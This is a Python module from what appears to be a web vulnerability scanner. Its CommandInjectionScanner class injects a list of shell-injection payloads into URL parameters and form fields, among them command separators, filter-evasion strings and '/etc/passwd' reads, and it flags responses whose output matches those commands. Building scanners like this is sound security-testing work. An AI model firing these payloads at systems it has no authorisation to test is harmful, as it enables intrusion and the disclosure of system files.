import logging
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union

logger = logging.getLogger(__name__)

class CommandInjectionScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        
        # Payloads for Command Injection testing
        self.payloads = [
            # Basic command separators
            ";id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "& ping -c 1 127.0.0.1",
            "&& ping -c 1 127.0.0.1",
            "`ping -c 1 127.0.0.1`",
            "$(ping -c 1 127.0.0.1)",
            
            # Windows specific
            "& dir",
            "&& dir",
            "| dir",
            "|| dir",
            "; dir",
            "& ipconfig",
            "&& ipconfig",
            "| ipconfig",
            "|| ipconfig",
            "; ipconfig",
            
            # Blind command injection (time-based)
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "& timeout 5",
            "&& timeout 5",
            
            # Encoded payloads
            "%3Bid",
            "%7C%20id",
            "%26%20id",
            "%60id%60",
            
            # Newline injection
            "\nid",
            "\r\nid",
            "\n\rid",
            
            # Filter evasion
            "' ; id",
            "') ; id",
            "') || id ; (",
            "'; id; echo '",
            "\"; id; echo \"",
            "' & id &'",
            "' && id && '",
            "'; cat /etc/passwd; echo '",
            "\"; cat /etc/passwd; echo \"",
            
            # Command substitution
            "${IFS}cat${IFS}/etc/passwd",
            ">dir",
            "i\\d",
            "/???/??t /???/p??s??",
            
            # Special characters
            "a;b;c;d;id",
            "||id;x||",
            "|id|",
            "&id&",
            "&&id&&"
        ]
        
        # Patterns that might indicate a successful Command Injection
        self.command_injection_patterns = [
            # Unix command output patterns
            r"uid=\d+\(\w+\) gid=\d+\(\w+\)",  # id command output
            r"root:.*:0:0:",                   # /etc/passwd
            r"PING.*bytes from",               # ping output
            r"icmp_seq=\d+ ttl=\d+",           # ping output
            r"rtt min/avg/max/mdev",           # ping output summary
            r"\d+ packets transmitted",        # ping output summary
            
            # Windows command output patterns
            r"Volume in drive [A-Z] is",       # dir output
            r"Directory of",                   # dir output
            r"Windows IP Configuration",       # ipconfig output
            r"Ethernet adapter",               # ipconfig output
            r"IPv[46] Address",                # ipconfig output
            r"Default Gateway",                # ipconfig output
            r"Subnet Mask",                    # ipconfig output
            
            # Directory listing patterns
            r"total \d+",                      # ls -l output
            r"drwx",                           # ls -l directory
            r"-rwx",                           # ls -l file
            r"<DIR>",                          # Windows dir output
            
            # System information patterns
            r"Linux version",                  # uname -a output
            r"Darwin Kernel Version",          # uname -a on macOS
            r"Microsoft Windows \[Version",    # ver command on Windows
            
            # Error messages that might reveal Command Injection
            r"sh: .*: command not found",
            r"bash: .*: command not found",
            r"The system cannot find the path specified",
            r"'.*' is not recognized as an internal or external command",
            r"syntax error near unexpected token",
            r"unexpected EOF while looking for matching"
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Look for URL parameters that might be vulnerable to Command Injection
            command_injection_prone_params = self._identify_command_injection_prone_params(params)
            
            if params:
                for param in params:
                    # Prioritize suspicious parameters
                    if param in command_injection_prone_params:
                        for payload in self.payloads:
                            try:
                                test_url = self._inject_payload(url, param, payload)
                                response = self.client.get(test_url, timeout=5)
                                
                                if response and self._is_vulnerable(response.text, payload):
                                    vulnerabilities.append({
                                        'type': 'Command Injection',
                                        'url': test_url,
                                        'payload': payload,
                                        'evidence': self._get_evidence(response.text, payload),
                                        'severity': 'critical',
                                        'param': param,
                                        'method': 'GET'
                                    })
                            except Exception as e:
                                logger.error(f"Command Injection GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        # Find fields that might be vulnerable to Command Injection
                        command_injection_prone_fields = self._identify_command_injection_prone_fields(form_fields)
                        
                        for field in form_fields:
                            field_name = field.get('name') if isinstance(field, dict) else field
                            
                            # Prioritize suspicious fields
                            if field_name in command_injection_prone_fields:
                                for payload in self.payloads:
                                    try:
                                        test_data = {}
                                        for f in form_fields:
                                            f_name = f.get('name') if isinstance(f, dict) else f
                                            test_data[f_name] = payload if f_name == field_name else 'test'
                                        
                                        if method == 'POST':
                                            response = self.client.post(action, data=test_data, timeout=5)
                                        elif method == 'GET':
                                            response = self.client.get(action, params=test_data, timeout=5)
                                        else:
                                            logger.warning(f"Unsupported form method: {method}")
                                            continue
                                        
                                        if response and self._is_vulnerable(response.text, payload):
                                            vulnerabilities.append({
                                                'type': 'Command Injection',
                                                'url': action,
                                                'payload': payload,
                                                'evidence': self._get_evidence(response.text, payload),
                                                'severity': 'critical',
                                                'param': field_name,
                                                'method': method
                                            })
                                    except Exception as e:
                                        logger.error(f"Command Injection form scan error for field {field_name}: {str(e)}")
                    except Exception as e:
                        logger.error(f"Command Injection form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"Command Injection scan error: {str(e)}")
        
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check for patterns that indicate successful Command Injection
        for pattern in self.command_injection_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        # Additional checks for specific payloads
        if "id" in payload and re.search(r"uid=\d+\(", response_text):
            return True
            
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return True
            
        if "ipconfig" in payload and "Windows IP Configuration" in response_text:
            return True
            
        if "dir" in payload and ("Directory of" in response_text or "Volume in drive" in response_text):
            return True
            
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Extract evidence of Command Injection vulnerability
        for pattern in self.command_injection_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return f"Command Injection pattern detected: {match.group(0)}"
                
        # If we couldn't find a specific pattern but determined it's vulnerable
        if "id" in payload and re.search(r"uid=\d+\(", response_text):
            return "Command output leaked: id command"
                
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return "Command output leaked: cat /etc/passwd"
                
        if "ipconfig" in payload and "Windows IP Configuration" in response_text:
            return "Command output leaked: ipconfig command"
                
        if "dir" in payload and ("Directory of" in response_text or "Volume in drive" in response_text):
            return "Command output leaked: dir command"
                
        return "Command Injection vulnerability detected through response analysis"

    def _identify_command_injection_prone_params(self, params: Dict) -> List[str]:
        """Identify parameters that are likely to be vulnerable to Command Injection"""
        command_injection_prone_params = []
        
        suspicious_names = [
            'cmd', 'command', 'exec', 'execute', 'run', 'system', 'shell', 'bash', 'sh',
            'ping', 'query', 'jump', 'code', 'process', 'proc', 'cli', 'do', 'action',
            'exe', 'app', 'application', 'eval', 'function', 'func', 'method', 'op',
            'option', 'opts', 'param', 'arg', 'args', 'argv', 'call', 'script', 'program',
            'tool', 'util', 'utility', 'bin', 'cgi', 'api', 'job', 'task', 'host', 'target'
        ]
        
        for param in params:
            param_lower = param.lower()
            
            # Check if parameter name suggests command execution
            if any(suspicious in param_lower for suspicious in suspicious_names):
                command_injection_prone_params.append(param)
                
            # Check if parameter value looks like a command
            for value in params[param]:
                if any(c in value for c in [';', '|', '&', '`', '$', '(', ')']):
                    command_injection_prone_params.append(param)
                    break
                    
        return command_injection_prone_params

    def _identify_command_injection_prone_fields(self, fields: List) -> List[str]:
        """Identify form fields that are likely to be vulnerable to Command Injection"""
        command_injection_prone_fields = []
        
        suspicious_names = [
            'cmd', 'command', 'exec', 'execute', 'run', 'system', 'shell', 'bash', 'sh',
            'ping', 'query', 'jump', 'code', 'process', 'proc', 'cli', 'do', 'action',
            'exe', 'app', 'application', 'eval', 'function', 'func', 'method', 'op',
            'option', 'opts', 'param', 'arg', 'args', 'argv', 'call', 'script', 'program',
            'tool', 'util', 'utility', 'bin', 'cgi', 'api', 'job', 'task', 'host', 'target'
        ]
        
        for field in fields:
            field_name = field.get('name') if isinstance(field, dict) else field
            if not field_name:
                continue
                
            field_lower = field_name.lower()
            
            # Check if field name suggests command execution
            if any(suspicious in field_lower for suspicious in suspicious_names):
                command_injection_prone_fields.append(field_name)
                
        return command_injection_prone_fields
